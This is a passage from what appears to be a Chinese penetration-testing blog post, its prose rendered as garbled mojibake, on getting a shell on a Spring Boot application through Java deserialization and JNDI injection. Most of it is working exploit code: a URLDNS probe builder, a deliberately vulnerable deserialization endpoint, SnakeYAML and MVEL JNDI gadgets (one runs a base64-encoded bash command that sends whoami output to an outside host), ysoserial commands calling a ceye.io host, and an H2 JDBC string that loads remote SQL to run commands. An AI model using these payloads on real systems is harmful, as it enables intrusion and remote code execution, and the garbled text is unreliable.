ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…<code>1.ser</code>ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>        <span class="token comment">//ois.readObject();</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºåŠ¨æ€ç”Ÿæˆçš„ç±»ä¹Ÿå¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œå› æ­¤ä¸Šé¢ä»£ç ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®ï¼Œæœ€å¥½åœ¨å¦å¤–ä¸€ä¸ªç¯å¢ƒé‡Œé¢ååºåˆ—åŒ–æµ‹è¯•ã€‚<br>postè¯·æ±‚æäº¤ä¸Šé¢ç”Ÿæˆçš„<code>1.ser</code>åˆ°<code>/yso</code>æ¥å£ï¼Œå¦‚æœç”Ÿæˆ<code>1.ser</code>é‡Œé¢çš„ç±»åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å­˜åœ¨ï¼Œåˆ™ä¼šæ”¶åˆ°dnslogè¯·æ±‚ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç‚å­—è¾ˆå¸ˆå‚…å·²ç»å†™å¥½äº†<a href="https://github.com/kezibei/Urldns">URLDNS</a>ï¼Œå¯ä»¥ç”Ÿæˆæ¢æµ‹éœ€è¦çš„åºåˆ—åŒ–æ•°æ®åŒ…ã€‚å½“å­˜åœ¨JNDIæ³¨å…¥çš„æ—¶å€™ï¼Œå¯åŠ¨LDAPæœåŠ¡:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>ï¼Œç„¶åä½¿ç”¨PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>ã€‚</p><h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>å€Ÿç”¨Ceye.ioæ¢æµ‹H2 Databaseçš„é¡µé¢ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨çš„é“¾å¾ˆå¤šï¼Œæ¯”å¦‚<code>cc1, cb17ã€mvelã€snakeyaml</code>ç­‰ï¼Œå…¶ä¸­<code>cc1ã€cb17</code>è¿™äº›é“¾å±äºLDAPååºåˆ—åŒ–ï¼Œ<code>mvelã€snkeyaml</code>å±äºåŠ è½½æœ¬åœ°Classã€‚<br>æµ…è“å¸ˆå‚…åœ¨<a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a>é‡Œé¢è®²çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨<code>snkeyml</code>æ”»å‡»ï¼Œä¸»è¦åˆ©ç”¨ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>            <span class="token string">"]"</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æœåŠ¡ç«¯ä½¿ç”¨RMIæ‰˜ç®¡ï¼Œç„¶åå¼€å¯<a href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>åœ¨æ›´æ¢MVELæ‰§è¡Œçš„æ—¶å€™ï¼Œæœ¬åœ°æµ‹è¯•å¼¹è®¡ç®—å™¨æˆåŠŸï¼Œä½†æ˜¯æ¢æˆæ‰§è¡Œå‘½ä»¤å°±ä¼šå¤±è´¥ï¼Œä½¿ç”¨IDEAæœ¬åœ°è°ƒè¯•ä¹‹åå‘ç°æŠŠpushå»æ‰ï¼Œç„¶åå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œå…·ä½“åŸå› éœ€è¦å†è·Ÿè¸ªä¸€éï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span><span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"><a href="#åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡" class="headerlink" title="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"></a>åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡</h3><p>LDAP Serveré™¤äº†ä½¿ç”¨JNDI Referenceè¿›è¡Œåˆ©ç”¨ä¹‹å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœJavaå¯¹è±¡çš„<code>javaSerializedData</code>å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„<code>obj.decodeObject()</code>æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥åˆ©ç”¨å—å®³è€…æœ¬åœ°CLASSPATHä¸­å­˜åœ¨æ¼æ´çš„ååºåˆ—åŒ–Gadgetè¾¾åˆ°ç»•è¿‡é™åˆ¶æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚</p><p>ä½¿ç”¨CCé“¾å¯ä»¥æµ‹è¯•æˆåŠŸï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopyjava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†æ˜¯åœ¨ä½¿ç”¨CBé“¾çš„æ—¶å€™ï¼Œæ‰§è¡Œå‘½ä»¤å¤±è´¥:<br><img src="/2022/03/18/from-spring-boot-to-getshell/3.png"><br>å¯ä»¥ä»æŠ¥é”™åŸå› çœ‹å‡ºæ¥ï¼Œå› ä¸ºCommonsBeanutils1çš„ç‰ˆæœ¬ä¸åŒï¼ŒBeanComparatorè¿™ä¸ªç±»çš„<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUIDä¸ä¸€æ ·</a>ï¼Œä¼šé€ æˆååºåˆ—åŒ–å¤±è´¥ã€‚1.7x-1.8xä¸º<code>-3490850999041592962</code>,1.9xä¸º<code>-2044202215314119608</code>ã€‚<br>æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p><ul><li>æ›¿æ¢ysoserialçš„CommonsBeanutils1ï¼Œä½¿ç”¨<a href="http://wjlshare.com/archives/1575">é­”æ”¹ç‰ˆæœ¬çš„ysoserial</a></li><li>ç”Ÿæˆååºåˆ—åŒ–æ•°æ®ä¹‹åï¼Œ<a href="https://github.com/phith0n/zkar">ä¿®æ”¹SerialVersionUID</a>ä¸ºå¯¹åº”ç‰ˆæœ¬çš„å€¼</li></ul><p>åˆšå¥½æ—©ä¸Šçœ‹åˆ°På¸ˆå‚…å‘çš„æ–‡ç« ï¼Œå°è¯•ä½¿ç”¨<a href="https://github.com/phith0n/zkar">zkar</a>ä¿®æ”¹ysoserialç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®åŒ…ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸã€‚</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/phith0n/zkar/serz"</span><span class="token string">"io/ioutil"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span><span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span><span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p>å‚è€ƒsu18å¸ˆå‚…çš„<a href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">jdbc-connection-url-attack</a>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;poc.sql&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿œç¨‹æœåŠ¡å™¨çš„æ¶æ„SQL:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS <span class="token keyword">EXEC</span> <span class="token keyword">AS</span> <span class="token string">'String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return "su18";&#125;'</span><span class="token punctuation">;</span><span class="token keyword">CALL</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'open -a Calculator.app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Spring &lt; 2.3.0çš„æ—¶å€™ï¼Œä¼šé»˜è®¤åˆ›å»º<code>jdbc:h2:mem:testdb</code>ï¼ŒSpring &gt;= 2.3.0çš„æ—¶å€™ï¼ŒSpringä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªUUIDéšæœºæ•°æ®åº“åï¼Œæ•°æ®åº“åå¯ä»¥åœ¨Spirngçš„æ—¥å¿—é‡Œçœ‹åˆ°ã€‚</p><p>æ‰€ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•çš„æ—¶å€™éœ€è¦æ»¡è¶³ä»¥ä¸‹ä»»æ„ä¸€ä¸ªæ¡ä»¶ï¼š</p><ul><li>Spring &lt; 2.3.0</li><li>æå‰è·å–åˆ°H2 databaseçš„ç”¨æˆ·å¯†ç </li></ul><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>RMIæ‰˜ç®¡åœ¨VPSçš„æ—¶å€™ï¼Œä¿®æ”¹<a href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>ä¸ºè‡ªå·±æœåŠ¡å™¨çš„IPåœ°å€</li><li>åœ¨å®Œå…¨é»‘ç›’çš„æƒ…å†µä¸‹ï¼Œæ³¨æ„SerialVersionUIDä¸åŒ¹é…çš„é—®é¢˜ï¼Œå…·ä½“è§<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li></ul><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://81.68.118.217/index.php/archives/62/">JNDIæ³¨å…¥é«˜ç‰ˆæœ¬ç»•è¿‡</a></li><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ 